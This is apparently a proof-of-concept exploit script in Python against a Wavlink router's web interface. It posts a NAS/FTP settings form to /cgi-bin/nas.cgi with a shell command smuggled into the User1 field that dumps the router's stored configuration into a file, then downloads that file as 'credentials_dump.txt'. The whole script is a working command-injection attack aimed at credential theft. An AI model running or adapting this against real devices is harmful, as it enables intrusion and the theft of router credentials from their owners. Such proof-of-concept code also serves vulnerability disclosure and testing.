import requests

headers={
"Host": "192.168.10.1",
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/x-www-form-urlencoded",
"Accept-Encoding": "gzip, deflate",
"Origin": "http://192.168.10.1",
"Connection": "keep-alive",
"Referer": "http://192.168.10.1/nas_disk.shtml?r=43627",
"Upgrade-Insecure-Requests": "1"
}

params = {
"page": "nas",
"ftp_enabled": 1,
"ftp_name": "WAVLINK",
"ftp_anomymous": 0,
"ftp_port": 21,
"ftp_max_sessions": 10,
"ftp_adddir": 1,
"ftp_rename": 1,
"ftp_remove": 1,
"ftp_read": 1,
"ftp_write": 1,
"ftp_download": 1,
"ftp_upload": 1,
"smb_enabled": 1,
"smb_workgroup": "WAVLINK",
"smb_netbios": "wifi.wavlink.com",
"workgroup": "WAVLINK",
"User1": "share; ralink_init show 2860 >> dump ;",
"User1Passwd": "share"
}

try:
    #will error out here, doesnt matter, command injection still completes
    requests.post(url="http://192.168.10.1/cgi-bin/nas.cgi", headers=headers, data=params)
except:
    pass

#now we download the file
r = requests.get("http://192.168.10.1/cgi-bin/dump", allow_redirects=True)

with open("credentials_dump.txt", 'wb') as file:
    file.write(r.content)

